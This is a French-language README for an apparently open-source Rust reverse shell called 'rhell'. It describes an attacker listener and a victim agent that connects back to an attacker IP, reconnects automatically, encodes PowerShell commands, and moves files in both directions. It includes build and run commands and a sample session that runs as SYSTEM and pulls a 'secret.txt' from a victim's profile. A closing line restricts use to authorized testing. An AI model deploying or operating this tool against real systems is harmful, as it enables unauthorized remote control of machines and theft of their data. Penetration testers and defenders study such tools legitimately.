# rhell

Rev shell en Rust
---

## Architecture

```
revshell-rs/
├── src/
│   ├── lib.rs          # Constantes, protocole, utilitaires partagés
│   ├── bin/
│   │   ├── server.rs   # Listener interactif (attaquant)
│   │   └── client.rs   # Agent (cible — se connecte en retour)
├── output/             # Binaires compilés
│   ├── server_linux
│   ├── client_linux
│   ├── server.exe
│   └── client.exe
├── build_all.sh        # Script de compilation multi-plateforme
└── Cargo.toml
```

| Composant | Rôle |
|-----------|------|
| **Server** | Écoute sur un port, affiche un prompt interactif, journalise la session |
| **Client** | S'exécute sur la cible, se reconnecte automatiquement, exécute les commandes |

---

## Fonctionnalités

- **Zéro dépendance** — stdlib Rust uniquement
- **Cross-platform** — binaires Linux (ELF) et Windows (PE) depuis une seule codebase
- **Protocole de handshake** — vérification de connexion (`RS_H1` / `RS_A1`)
- **Sysinfo automatique** — user, hostname, OS, arch, cwd envoyés à la connexion
- **Transfert de fichiers** — upload (server → agent) et download (agent → server)
- **Gestion du répertoire courant** — commande `cd` persistante côté agent
- **Switch shell Windows** — bascule CMD ↔ PowerShell en session
- **PowerShell encodé** — commandes PS encodées en base64 UTF-16 pour éviter les problèmes d'échappement
- **Reconnexion automatique** — 100 tentatives espacées de 5 secondes
- **Journalisation** — toutes les commandes et sorties écrites dans un fichier log
- **Binaires optimisés** — LTO, `opt-level = z`, strip, `panic = abort`

---

## Compilation

### Prérequis

- [Rust / Cargo](https://rustup.rs)
- Pour les binaires Windows : `gcc-mingw-w64-x86-64`

```bash
sudo apt install gcc-mingw-w64-x86-64
```

### Build

```bash
chmod +x build_all.sh
./build_all.sh
```

Le script compile automatiquement Linux (ELF) et Windows (PE via MinGW si disponible). Les binaires sont déposés dans `output/`.

---

## Utilisation

### 1. Lancer le serveur (machine attaquante)

```bash
./output/server_linux -H 0.0.0.0 -p 4444 -l session.log
```

| Option | Description | Défaut |
|--------|-------------|--------|
| `-H` / `--host` | Adresse d'écoute | `127.0.0.1` |
| `-p` / `--port` | Port d'écoute | `4444` |
| `-l` / `--log` | Fichier de log | `session.log` |

### 2. Lancer l'agent (machine cible)

```bash
# Linux
./output/client_linux -H <IP_ATTAQUANT> -p 4444

# Windows
output\client.exe -H <IP_ATTAQUANT> -p 4444
```

| Option | Description | Défaut |
|--------|-------------|--------|
| `-H` / `--host` | IP du serveur | `127.0.0.1` |
| `-p` / `--port` | Port du serveur | `4444` |

---

## Commandes en session

| Commande | Description |
|----------|-------------|
| `help` | Afficher l'aide |
| `exit` / `quit` | Fermer la session |
| `upload <local> <remote>` | Envoyer un fichier du serveur vers l'agent |
| `download <remote> <local>` | Récupérer un fichier de l'agent vers le serveur |
| `cd <path>` | Changer de répertoire sur l'agent |
| `powershell` | Basculer en PowerShell (Windows uniquement) |
| `cmd` | Revenir en CMD (Windows uniquement) |
| *toute autre entrée* | Exécutée comme commande shell sur l'agent |

### Exemples

```
shell@192.168.1.50:12345 > whoami
nt authority\system

shell@192.168.1.50:12345 > upload /tmp/tool.exe C:\Windows\Temp\tool.exe
shell@192.168.1.50:12345 > download C:\Users\victim\secret.txt /tmp/secret.txt

shell@192.168.1.50:12345 > powershell
Switched to PowerShell
shell@192.168.1.50:12345 > Get-Process | Select-Object Name,Id | Sort-Object Name
```

---

## Protocole

```
Agent                          Server
  |                              |
  |──── HANDSHAKE_REQ (RS_H1) ──>|
  |<─── HANDSHAKE_ACK (RS_A1) ───|
  |──── sysinfo + <E> ──────────>|
  |                              |
  |<─── commande \n ─────────────|
  |──── output + <E> ───────────>|
  |          (boucle)            |
```

- Le marqueur de fin de message est `\n<E>\n`
- Les transferts de fichiers utilisent les marqueurs `<FILE_BEGIN>`, `<FILE_END>`, `<FILE_OK>`, `<FILE_ERR>` avec une taille en big-endian sur 8 octets

---

## Build Release — optimisations

```toml
[profile.release]
opt-level = "z"        # Taille minimale
lto = true             # Link-Time Optimization
codegen-units = 1      # Meilleure optimisation
panic = "abort"        # Pas de stack unwinding
strip = true           # Symboles supprimés
overflow-checks = false
```

---

## Licence

Usage réservé aux environnements de test autorisés. Aucune garantie fournie.
